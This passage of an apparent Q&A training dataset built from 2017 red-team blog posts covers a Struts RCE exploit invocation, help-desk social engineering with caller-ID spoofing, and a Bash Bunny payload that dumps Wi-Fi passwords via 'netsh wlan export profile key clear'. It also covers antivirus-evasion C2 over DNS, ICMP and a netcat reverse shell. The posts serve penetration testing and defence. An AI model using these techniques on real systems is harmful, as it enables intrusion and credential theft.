        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Wi-Fi Travel Kit v2 - Parts List Backtrack</title>\n<taxonomies>Author, Jordan Drysdale, Red Team, Wireless, Hak5, Travel Bag, Wi-Fi Attack Kits, Wi-Fi travel kit, Wireless Gear</taxonomies>\n<creation_date>Mon, 06 Mar 2017 18:02:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale The Wi-Fi travel kit part one was popular enough that back by demand here are the specific parts part numbers and links Pretty much everything on the list in the original post is available at the Hak5 team's shop Sure Amazon is like 2 cheaper and Prime shipping is hard to argue with but we definitely like to support these folks akshop.com collections wireless-gear Wi-Fi Pineapple akshop.com products wifi-pineapple?variant 81044992 Alfa adapter 2.4 only akshop.com collections wireless-gear products alfa-usb-wifi-awus036neh TP-Link adapter also make the cut in a wireless travel kit ackerwarehouse.com product tp-link-tl-wn722n This next item is worth discussing for a brief moment The signal intensity on this bad boy can allow you to easily overwhelm the client wireless and roaming decisions What I mean here is that if we look at the client RSSI algorithm and blast them with a high intensity SSID that matches the target network the client has no choice mathematically except to jump over to our Wi-Fi This antenna is a must have Alfa Panel Antenna akshop.com collections wireless-gear products 7dbi-panel-antenna The Yagi This thing is amazing and its transmission range is huge Wandering through the SSIDs that lie just beyond the standard neighborhood wireless ecosystem is a frightening adventure akshop.com collections wireless-gear products 16dbi-yagi-antenna It is wise to carry several of the small form factor adapters The Pi's board adapter can be used to run your hostapd configuration The adapters can then be deployed as a remote management access point to the Kali build on the Pi akshop.com collections wireless-gear products ralink-usb-wifi-rt5370 Rubber Ducky because you can steal Windows network and WLAN configurations akshop.com products usb-rubber-ducky-deluxe Raspberry Pi3 go for the kit because why not ww.amazon.com CanaKit-Raspberry-Clear-Power-Supply dp B01C6EQNNK ref sr_1_2?s pc ie UTF8 qid 1488097176 sr 1-2 keywords raspberry pi 3 The TFT Monitor with HDMI works well for me There are a ton of options for Pi based display so definitely look around ww.amazon.com Sunfounder-1024x600-Display-Monitor-Raspberry dp B012ZRYDYY ref sr_1_15?ie UTF8 qid 1488098931 sr 8-15 keywords tft monitor Kali Linux for Raspberry Pi ocs.kali.org kali-on-arm install-kali-linux-arm-raspberry-pi GPS Puck This will allow you to geotag your wireless pcap data Kismet and tcpdump will capture this GPS data if the puck is online ww.amazon.com GlobalSat-BU-353-S4-USB-Receiver-Black dp B008200LHW ref sr_1_cc_1?s aps ie UTF8 qid 1488097253 sr 1-1-catcorr keywords gps puck This is a quick forum on the GPS Puck and Kali Linux orums.kali.org showthread.php?3288-GlobalSat-BU-353-USB-GPS The next item continues our airspace investigations but in a slightly different radio spectrum RFID cloning is fun ackerwarehouse.com product proxmark3-kit The Proxmark3 is the device I carry now but it has been updated to be more portable ackerwarehouse.com product proxmark3-rdv2-kit The following solar battery packs are larger than a field expedient battery pack should be but the charge capacity at 15000mAh is fantastic This will run my Pi rig with an external antenna attached for 24 hours ww.amazon.com FKANT-15000mAh-Portable-Flashlight-Cellphones dp B016ZFZ54E ref sr_1_5?ie UTF8 qid 1488098594 sr 8-5 keywords solar battery charger For the more portable battery pack this Anker is awesome ww.amazon.com Anker-PowerCore-Lipstick-Sized-Generation-Batteries dp B005X1Y7I2 ref sr_1_2?ie UTF8 qid 1488098748 sr 8-2 keywords lipstick battery charger That is it for now"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Strutting your stuff - Unauthenticated Remote Code Execution</title>\n<taxonomies>External/Internal, Red Team, Web App, Apache Struts, Unauthenticated Remote Code Execution</taxonomies>\n<creation_date>Fri, 10 Mar 2017 19:48:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Unauthenticated Remote Code Execution A hacker's best friend And that is what we have with CVE-2017-5638 Apache Struts with working exploit code here ithub.com rapid7 metasploit-framework issues 8064 Save the exploit code to a file and execute with Python passing two command line arguments The first command line argument is the URL to execute the attack against The URL should point to a Struts action page which you can find with a Google search like site example.com inurl action And the second command line parameter is the OS command that you want to run against the exploited system A complete example is given below python exploit.py xample.com some example.action ls -l Perhaps you are a defender and want to ensure all your systems have been patched but you have multiple web servers behind your domain name In this case you will want to run the exploit against specific IP addresses as shown below python exploit.py pecific.ip.addr.here some example.action ls -l The Proof-of-Concept code will likely throw an SSL certificate error in this case Make the following modifications highlighted in yellow to support this use case The inclusion of the Host header may not be required depending on your web server configuration Good Luck and get this fixed yesterday"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Social Engineering - Sometimes It's Too Easy</title>\n<taxonomies>Red Team, Social Engineering, fun fun fun, helpful help desk, IT Help Desk, maternity leave, password reset, social engineering, VM</taxonomies>\n<creation_date>Tue, 14 Mar 2017 15:38:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts A fun story from an adventure in social engineering not too long ago Thought I'd pass on some things I learned and ways to be more prepared in the future The Goal Call the IT Help Desk for a customer and try to reset the password for five users I was not provided the IT Help Desk number or the names of employees I called the general contact number listed on the contact us web page and asked for the phone of the IT help desk That was easy I searched social media for employee names That was easy too The Ruse I'm on maternity leave and can't access email via Outlook Web Access OWA First Call The help desk asks for my employee number Uh I don't have that handy can you look it up by my last name she does and then provides it to me She takes me through the built-in forgot password functionality where I can have an email or text sent to the number on file I wasn't prepared for this and didn't want to send a reset to the actual employee so I pretended to do the reset and thanked her for helping me get in Second Call Same story but this time I'm prepared to say that the contact information for the password reset is not correct Attendant asks me to go to a remote assistance site so she can connect to my computer This gives her remote control of my test Virtual Machine thankfully it is a VM specific to this customer I was not expecting this and I've got the Burp Suite tool running in the background hope she doesn't know what that tool is for She brings up the login page and goes to enter my email address on the OWA login and a couple other employee logins come as autofill suggestions because of other accounts I already got access to through password spraying Then she brings up Outlook where I'm already logged into another employee's account Oops I tell her it is a co-worker Then she brings up the windows command prompt which says Users Carrie Roberts not the person I was posing as but this did not appear to raise suspicions She gives me a new password for the OWA account Password 123 and I'm in I ask if I should change my password now and she says As you prefer interesting advice The Help Desk calls my cell number back SIX TIMES maybe they wanted the password back I never answer but decide that perhaps I should be using my caller ID faker app which I do for the remaining calls Third Call Using the caller ID faker this time part way into the call the call drops stupid app I call back a couple of times and get back with the same person She says 'I tried to call you back but it said it couldn't connect Me Uhhhhhhhh that's odd anyway about that reset Attendant says resetting my password requires manager approval Crumbs Fourth Call Sorry resetting your password is against security policy But she did say My heart is in my throat for you so that made me feel better Fifth Call I wait two days before making the last call This time I created a new user account on my Windows VM with a username to match the ruse and no other suspicious things like concurrent logins as other employees Attendant does the remote access thing to remotely control my PC I play a baby crying soundtrack in the background to go along with the maternity leave ruse I just had to She says she will chat with me via the chat window and hangs up I guess the baby was too much She uninstalls Microsoft office Why I don't know because I told her I wanted to login online to OWA and I even had it open After that she resets my password and enters it and lets me set the new password Then she installs Office 365 from the victim's account and configures Outlook for me I thank her and let her know that this will be very handy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Get USB_Exfiltration Payload Using the Bash Bunny</title>\n<taxonomies>Author, Jordan Drysdale, Red Team, Red Team Tools, all the payloads, bash bunny, Hak5, usb, usb exfiltrator, windows XP</taxonomies>\n<creation_date>Thu, 16 Mar 2017 16:06:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale This is a super quick write-up on the first very useful payload we tested and confirmed as 100 reliable on all Windows systems XP-SP3 with PowerShell enabled Bash Bunny Wiki iki.bashbunny.com !index.md Payload ithub.com hak5 bashbunny-payloads tree master payloads library usb_exfiltrator The most important piece is an understanding of the exceptionally simple switch positioning and directory structure We downloaded the entirety of the current payloads from the Bunny's git here ithub.com hak5 bashbunny-payloads The only edits we made to the USB_Exfil payload before copying it over to the switch1 directory was to remove the .PDF reference This allowed us to pull sub-directories inside the user's documents directory Be very careful Depending on the size of your target's Documents directory you can fill the Bash Bunny's storage at just under 2GB Lastly in testing this one out the system has to be unlocked Regardless have fun"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Cross-Post: MIR-SWAMP PEN TESTING WITH BLACK HILLS</title>\n<taxonomies>Red Team, pentest, Software Assurance Marketplace, SWAMP, what a pen test looks like</taxonomies>\n<creation_date>Tue, 21 Mar 2017 15:16:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This is a cross-posted blog post written by A Miller from SWAMP the Software Assurance Marketplace BHIS recently did an engagement with them and you can read about the entire experience on their website The SWAMP team prides itself on having a dedicated cybersecurity group We take this responsibility very seriously As proud as we are it would be foolish to not seek review by someone unaffiliated with our project that can provide an objective assessment So when the reputable cybersecurity firm Black Hills Information Security BHIS generously offered to perform a network penetration test web application penetration test and risk assessment all pro bono we jumped at the opportunity BHIS is owned by John Strand one of the co-hosts of the popular Paul's Security Weekly podcast The pen test planning started with our staff providing a high level overview of the SWAMP network and DNS namespace to determine what resources would be considered in-scope and to plan the order in which the resources would be tested It also gave us an opportunity to announce maintenance windows during times when user facing services would be tested SWAMP users were notified of these windows in advance of the testing However the SWAMP's infrastructure was designed to handle significant network loads and was not disrupted by the pen test activities The actual pen testing started on January 9th 2017 with a reconnaissance phase in which BHIS Read the rest here ontinuousassurance.org 2017 03 16 mir-swamp-pen-testing-with-black-hills"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Pull Wireless Credentials with the Bash Bunny</title>\n<taxonomies>Red Team, Red Team Tools, bash bunny, BashBunny, bashbunny-payloads, Hak5, Wi-Fi Creds, Wireless Credentials</taxonomies>\n<creation_date>Thu, 23 Mar 2017 16:34:11 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven All of the BHIS testers are pretty geeked about Hak5's newest toy the Bash Bunny Last week Jordan blogged about the USB Exfiltration payload Today I will demo another nifty payload that was uploaded to their GitHub repo WiPassDump This module works on unlocked Windows machines to pull out the clear text credentials for any WEP or WPA 2-PSK wireless network profiles that have been saved on the computer Basically what this module does is force an administrator command prompt to run and then issue the following command netsh wlan export profile key clear Since the machine has to be unlocked anyway you might be wondering why not just open a command prompt and run the above command manually Why bother with the Bash Bunny Here is why When you are doing a physical penetration test or red team engagement you will often find unlocked workstations If you are going to collect data from such a workstation it is much easier to be stealthy if all you have to do is plug-in a USB You would not necessarily even need to sit down at the computer Let's face it typing on someone else's keyboard is definitely a red flag if someone were to notice you but standing near someone's desk while you wait about 7 seconds for the Bash Bunny to do its job can be much easier explained if you get caught Here is how to prep and launch the attack First put the bunny in arming mode switch position 3 toward the insertion point and grab the payload files here Save the WiPassDump files into one of the attack folders switch1 or switch2 Open up payload.txt in a text editor and make sure the language settings match the language of the computer you will be running this on The payload as uploaded is set up for a French Candian language machine I have changed mine to US English The Q ALT y command means to enter the letter y when the UAC prompt is presented This is the UAC elevation permission Now save your changes and eject the drive To launch the attack move the switch to the switch position where you stored the payloads in my case switch position 1 ...and plug it into an unlocked machine It took about 7 seconds for this to run on my Windows 8 machine The netsh command that ran created a separate file for each of the wireless network profiles found on the system Here is what it found on one of my test machines Each of these files contains the SSID and where possible WEP WPA-PSK WPA2-PSK the passphrase Then I tried running the script using an unprivileged account a standard user in Microsoft lingo It didn't work Interestingly enough an unprivileged user is allowed to successfully dump the wireless profiles including the passwords in cleartext So I modified the payload.txt file like this .and it worked like a champ No administrator privilege needed I tested this attack against a standard user on a Windows 8 and a Windows 10 machine I suspect it will work the same way on other versions as well So how do you prevent this type of attack er um or at least limit the damage Don't use WPA 2-PSK on corporate networks Don't leave workstations unlocked and unattended Use full disk encryption to thwart a Konboot lock-screen bypass attack Disable USB access on company-owned computers or limit to specific known devices Join the BHIS Blog Mailing List get notified when we post new blogs webcasts and podcasts jetpack_subscription_form show_only_email_and_button true custom_background_button_color undefined custom_text_button_color undefined submit_button_text Subscribe submit_button_classes undefined show_subscribers_total true Sally Vandeven All of the BHIS testers are pretty geeked about Hak5's newest toy the Bash Bunny Last week Jordan blogged about the USB Exfiltration payload Today I will demo another nifty payload that was uploaded to their GitHub repo WiPassDump This module works on unlocked Windows machines to pull out the clear text credentials for any WEP or WPA 2-PSK wireless network profiles that have been saved on the computer Basically what this module does is force an administrator command prompt to run and then issue the following command netsh wlan export profile key clear Since the machine has to be unlocked anyway you might be wondering why not just open a command prompt and run the above command manually Why bother with the Bash Bunny Here is why When you are doing a physical penetration test or red team engagement you will often find unlocked workstations If you are going to collect data from such a workstation it is much easier to be stealthy if all you have to do is plug-in a USB You would not necessarily even need to sit down at the computer Let's face it typing on someone else's keyboard is definitely a red flag if someone were to notice you but standing near someone's desk while you wait about 7 seconds for the Bash Bunny to do its job can be much easier explained if you get caught Here is how to prep and launch the attack First put the bunny in arming mode switch position 3 toward the insertion point and grab the payload files here Save the WiPassDump files into one of the attack folders switch1 or switch2 Open up payload.txt in a text editor and make sure the language settings match the language of the computer you will be running this on The payload as uploaded is set up for a French Candian language machine I have changed mine to US English The Q ALT y command means to enter the letter y when the UAC prompt is presented This is the UAC elevation permission Now save your changes and eject the drive To launch the attack move the switch to the switch position where you stored the payloads in my case switch position 1 ...and plug it into an unlocked machine It took about 7 seconds for this to run on my Windows 8 machine The netsh command that ran created a separate file for each of the wireless network profiles found on the system Here is what it found on one of my test machines Each of these files contains the SSID and where possible WEP WPA-PSK WPA2-PSK the passphrase Then I tried running the script using an unprivileged account a standard user in Microsoft lingo It didn't work Interestingly enough an unprivileged user is allowed to successfully dump the wireless profiles including the passwords in cleartext So I modified the payload.txt file like this .and it worked like a champ No administrator privilege needed I tested this attack against a standard user on a Windows 8 and a Windows 10 machine I suspect it will work the same way on other versions as well So how do you prevent this type of attack er um or at least limit the damage Don't use WPA 2-PSK on corporate networks Don't leave workstations unlocked and unattended Use full disk encryption to thwart a Konboot lock-screen bypass attack Disable USB access on company-owned computers or limit to specific known devices"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypassing Cylance: Part 1 - Using VSAgent.exe</title>\n<taxonomies>Author, C2, David Fletcher, Red Team, anti-virus, AV, bypassing AV, bypassing Cylance, Cylance, VSAgent.exe</taxonomies>\n<creation_date>Mon, 27 Mar 2017 15:33:25 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Recently we had the opportunity to test a production Cylance environment Obviously each environment is going to be different and the efficacy of security controls relies largely on individual configuration However the posts over the next several days illustrate our observations in one such environment Different configurations and sound application of defense-in-depth will obviously yield different results This week we will illustrate the techniques that worked for getting command and control communication within the environment It should be noted that the environment did not have an effective application whitelisting implementation in place during testing In addition access to cmd.exe and powershell_ise.exe were not restricted This series will start with non-traditional C2 channels first VSAgent.exe BHIS has a custom C2 tool called VSAgent get it at John's 504 DropBox tinyurl.com 504extra2 which uses the ViewState parameter in a well-formed HTML page to communicate commands and their results between the C2 server and client The ViewState parameter is commonly used in ASP.NET web applications to maintain state between the client and the server Because this field is so commonly observed and is base64 encoded and optionally encrypted when in legitimate use it is a difficult target to inspect In this case the vsagent.exe client was simply downloaded to the target computer and executed The Cylance instance did not detect or prevent the vsagent.exe tool from executing and establishing a C2 channel Because of this other compensating controls should be in place to prevent this behavior For example web content filtering could be used to prevent download of executable files However this can typically be bypassed by downloading the file in a different format or an encrypted compressed archive then unpacking the file on the target host Alternatively a malicious employee or an attacker may deliver a tool like this using removable media A more appropriate countermeasure would be properly implemented application whitelisting When application whitelists are based on file signatures they are notoriously difficult to bypass and require techniques such as the use of rundll32.exe installutil.exe or msbuild.exe ____ Editor's Note This is part one of a special week-long five-part series about bypassing Cylance by David Check back for parts 2-5"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypassing Cylance: Part 2  Using DNSCat2</title>\n<taxonomies>Author, C2, David Fletcher, Red Team, anti-virus, AV, AV bypass, Cylance, Cylance Bypass, dnscat2, Pentesting</taxonomies>\n<creation_date>Tue, 28 Mar 2017 14:22:28 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher The following techniques serve to illustrate methods for obtaining C2 communication in a particular Cylance protected environment The configuration of the centralized infrastructure and the endpoint agents were not inspected prior to testing The environment may exhibit configuration errors and may not conform with best practice for deployment of Cylance infrastructure However in our experience misconfiguration is not uncommon and more times than not tends to have catastrophic results with regard to the overall security posture of an environment This is the reason that we test deployments before accepting their stated protection levels at face value In addition these posts serve to illustrate the necessity for defense-in-depth In each instance where C2 establishment was successful a secondary or tertiary control could have and should have compensated for the failure of the initial control Layered defense is a critical element of protection in any environment and organizations must face the fact that there is no silver bullet for information security See part one where we used VSAgent.exe here DNSCat2 Get this tool on GitHub here DNSCat2 The next non-traditional Cylance bypass included the use of the DNSCat2 C2 tool This tool establishes a C2 channel over DNS and queries and responses as its transport mechanism In this instance the tool could be executed with default parameters using encryption and an initial connection was established However the connection was immediately terminated However starting the server without encryption resulted in session establishment as seen below Once again the Cylance tools did not detect execution and C2 channel establishment using this tool As with VSAgent execution of this tool could have been halted using properly implemented application whitelisting techniques"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypassing Cylance: Part 3 - Netcat & Nishang ICMP C2 Channel</title>\n<taxonomies>Author, C2, David Fletcher, Red Team, anti-virus, AV, AV bypass, bypassing AV, bypassing Cylance, Cylance, Ncat, netcat, Nishang, Nishang ICMP C2 Channel</taxonomies>\n<creation_date>Wed, 29 Mar 2017 14:48:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher The following techniques serve to illustrate methods for obtaining C2 communication in a particular Cylance protected environment The configuration of the centralized infrastructure and the endpoint agents were not inspected prior to testing The environment may exhibit configuration errors and may not conform with best practice for deployment of Cylance infrastructure However in our experience misconfiguration is not uncommon and more times than not tends to have catastrophic results with regard to the overall security posture of an environment This is the reason that we test deployments before accepting their stated protection levels at face value In addition these posts serve to illustrate the necessity for defense-in-depth In each instance where C2 establishment was successful a secondary or tertiary control could have and should have compensated for the failure of the initial control Layered defense is a critical element of protection in any environment and organizations must face the fact that there is no silver bullet for information security See part one bypassing with SVAgent here and part two about bypassing with DNSCat2 here Netcat The third C2 method that went undetected by Cylance was raw netcat In this case the listener was a raw netcat shell shoveled outbound The netcat executable was downloaded to the target host and executed as seen below On the C2 server netcat was configured to listen on this port for inbound communication Upon connection from the end host a Windows shell was returned A smart attacker might upload the Nmap port of netcat named Ncat which support TLS encryption This would make the C2 channel all the more difficult to detect Unlike the previous C2 channels raw netcat C2 does not conform with a specific protocol In addition to the prior recommendations of filtering downloads and application whitelisting this communication can be defeated through protocol inspection If the boundary firewall supports application-level proxies that check for protocol conformance this traffic will be dropped Nishang ICMP C2 Channel The final non-traditional method of C2 that went undetected by Cylance was communication using ICMP payloads In this case the PowerShell script Invoke-PowerShellIcmp.ps1 from the Nishang framework was used Investigating the deployed configuration of Cylance revealed that it was configured to prevent execution of any content through the native PowerShell.exe interpreter However the PowerShell ISE was available on this host As a result the script could be loaded into the ISE and its functions exposed by either clicking the play button or using the familiar import-module syntax In this instance the play button was used Once the PowerShell script was loaded it was invoked as seen below The waiting C2 server caught the callback from the client granting shoveled shell access to the target computer In this case the organization can make a decision regarding ICMP in general If users don't need to ping hosts on the internet the organization can simply drop all outbound ICMP messages from internal hosts While PowerShell ISE worked fine for this script it should be noted that any script that includes embedded calls to the native PowerShell interpreter should be avoided In addition multi-threaded scripts may exhibit this same issue if the native interpreter is referenced The following PowerShell scripts were found to work when launched through the PowerShell ISE DomainPasswordSpray.ps1 Invoke-Kerberoast.ps1 Invoke-PowerShellICMP.ps1 PowerView.ps1 PowerUp.ps1 The CylancePROTECT script control module only blocked calls to the native interpreter Access to both cmd.exe and PowerShell_ise.exe should be restricted in the same fashion seen for PowerShell.exe Both of these tools provide enormous capability to an attacker for pivoting within an environment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypassing Cylance: Part 4 - Metasploit Meterpreter & PowerShell Empire Agent</title>\n<taxonomies>Author, C2, David Fletcher, Red Team, anti-virus, AV, bypassing AV, Cylance, Cylance Bypass, metasploit meterpreter, PowerShell, PowerShell Empire Agent</taxonomies>\n<creation_date>Thu, 30 Mar 2017 15:26:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher The following techniques serve to illustrate methods for obtaining C2 communication in a particular Cylance protected environment The configuration of the centralized infrastructure and the endpoint agents were not inspected prior to testing The environment may exhibit configuration errors and may not conform with best practice for deployment of Cylance infrastructure However in our experience misconfiguration is not uncommon and more times than not tends to have catastrophic results with regard to the overall security posture of an environment This is the reason that we test deployments before accepting their stated protection levels at face value In addition these posts serve to illustrate the necessity for defense-in-depth In each instance where C2 establishment was successful a secondary or tertiary control could have and should have compensated for the failure of the initial control Layered defense is a critical element of protection in any environment and organizations must face the fact that there is no silver bullet for information security Don't miss part 1 using VSAgent part 2 about using DNScat2 and part 3 where David used Netcat and Nishang After establishing successful C2 communication with several different tools using various protocols two more traditional payloads were attempted The first was Metasploit's Meterpreter and the second was a PowerShell Empire Agent Before diving into the details of each of the agents it was necessary to get PowerShell interpreter access on the target host Surprisingly the method that worked was renaming the native PowerShell.exe interpreter After renaming the executable Cylance no longer prevented execution of PowerShell within this environment Metasploit Meterpreter The Cylance agent was very effective at detecting and eradicating instances of Metasploit Meterpreter The Meterpreter payload 32-bit and 64-bit was delivered to the target host both in both unencoded and encoded forms with stage encoding enabled in the following package formats and a resulting shell was never achieved Staged Meterpreter Msfvenom Payload Staged Meterpreter Msfvenom Payload using Alternate EXE Template Stageless Meterpreter Msfvenom Payload DLL injection using RunDLL32.exe Uninstall execution using InstallUtil.exe PowerShell execution using PowerShell without PowerShell technique Modified Unicorn PowerShell payload Import-ShellCode and Inject-ShellCode Several PowerShell payloads were attempted However many of the Metasploit payloads make subsequent calls to the native PowerShell interpreter These payloads were decoded modified and re-encoded to use the renamed PowerShell interpreter However each time the PowerShell was executed the ensuing process was blocked by Cylance This same response was observed for each of the Meterpreter payloads delivered to the host In the interest of time other less powerful Metasploit payloads were not attempted PowerShell Empire Agent After gaining access to the native PowerShell interpreter by renaming the executable PowerShell Empire agent C2 could be obtained with minimal modification First the launcher stager PowerShell payload was generated as seen below Then the interpreter was altered to match the renamed interpreter on the host After execution a PowerShell Empire agent callback was observed from the target host This initial agent was executed with the default listener properties provided by PowerShell Empire The beaconing behavior five-second intervals was identified by Cylance and prevented after roughly three hours of agent communication However the communication profile of the agent was altered to include jitter and requests to non-default resources as described in this blog post by Carrie Roberts With the agent configured to communicate in this manner the C2 channel went undetected for more than 24 hours"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypassing Cylance: Part 5 - Looking Forward</title>\n<taxonomies>Author, C2, InfoSec 201, John Strand, Red Team, anti-virus, AV, Cylance, industry trends</taxonomies>\n<creation_date>Thu, 30 Mar 2017 22:49:14 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand We just finished up a walk through of how we bypassed Cylance in a previous engagement To conclude this exciting week I want to share a few comments and notes with everyone First we are a penetration testing firm We test what customers give us to test We do not test what the vendor wants us to test We test where the rubber meets the road Some have pointed out that the techniques we used were basic Yes many of the techniques we used were extremely rudimentary But they worked This in and of itself calls into question the validity of the marketing claims AV companies sometimes make Let's take a few moments and talk about those marketing claims and the NSS reports Why is it that companies like Cylance and CrowdStrike are so insane when it comes to people publicly testing their products Why is it that a small testing firm in South Dakota would be one of the only sources of information people have about a product's limitations I want to apologize to Cylance for putting them in the same category as CrowdStrike Cylance has not threatened litigation yet Like CrowdStrike they have insane EULA restrictions regarding the discussion review or independent analysis of their products This would be like Chevy Ford Toyota threatening to sue Car Driver or Consumer Reports anytime there was an unbiased investigative article written about one of their vehicles Would these same car companies hunt down customers of vehicles who wrote blogs and posted on bulletin boards with negative experiences Can you imagine if Cylance Symantec Oracle Microsoft were hunting down customers who said bad things about them That would be insane Orwellian Cylance is far better than most traditional blacklist AV products When we test a company we try multiple types of malware and Command and Control C2 This is so we can properly identify what the endpoint security tool can and cannot detect There are a number of cases we expect to be detected but seldom are with traditional blacklist AV With this test there were a number of cases where Cylance shined as compared to traditional AV There were a number of cool things that Cylance did detect It's far harder to redact that information But trust me They are better than most traditional AV There's always people who rightfully point out that whitelisting was not enabled and it would stop most if not all of the techniques we used We can't say enough positive things about whitelisting It's one of the single greatest defenses an organization can deploy But it's not magic that is held exclusively by Cylance or any other vendor It's something that can be deployed via Applocker or SRP via group policy albeit not without significant administrative overhead Thus claiming a security product didn't do well because whitelisting wasn't enabled is invalid The point is whitelisting is free It is not cannot and will never will be a feature in one product alone All vendors have special options and configurations which are great but rarely implemented in the real world There are features in many endpoint security products which would shut down most attacks Typically these features are never fully enabled deployed Is it because the product's flawed Not necessarily Often these features are disabled because they can decrease work productivity or have unexpected IT administrative costs consequently reducing the effectiveness of the security solution The industry wants security products to simply work with little to no interaction They want the easy button Cylance makes fantastic claims about Artificial Intelligence and how they're going to render all other AV obsolete Even being able to predict future attacks I want to believe this I really do but from what we've seen those claims are still a ways down the road I will say this product has a brilliant concept it is a step in the right direction though perhaps rushed to market before reaching butcher weight So what can we learn from this A couple of things First this highlights a need for more comprehensive unbiased testing of security products We've seen reports like the recent NSS Labs reports which leave substantial room for improvement Secondly there is still no silver bullet This industry's marketing capitalizes on silver bullets to solve 